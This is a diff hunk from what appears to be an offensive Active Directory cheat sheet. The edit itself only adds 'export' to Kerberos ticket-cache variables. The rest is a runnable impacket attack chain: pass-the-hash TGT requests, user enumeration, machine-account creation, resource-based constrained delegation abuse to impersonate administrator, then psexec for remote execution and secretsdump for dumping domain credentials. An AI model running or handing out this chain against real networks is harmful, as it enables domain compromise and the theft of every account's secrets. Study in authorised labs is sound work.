@@ -532,8 +532,8 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C
 
 +---------- Use .ccache ----------+
-KRB5CCNAME=`pwd`/Guest.ccache
-KRB5CCNAME=`pwd`/$USERNAME.ccache
+export KRB5CCNAME=`pwd`/Guest.ccache
+export KRB5CCNAME=`pwd`/$USERNAME.ccache
 
 +---------- Kerberos .ccache Negotiation ----------+
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
@@ -546,7 +546,7 @@ impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-nam
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
 impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
 impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "host/$DC"
-KRB5CCNAME=`pwd`/administrator@host_
+export KRB5CCNAME=`pwd`/administrator@host_
 impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 
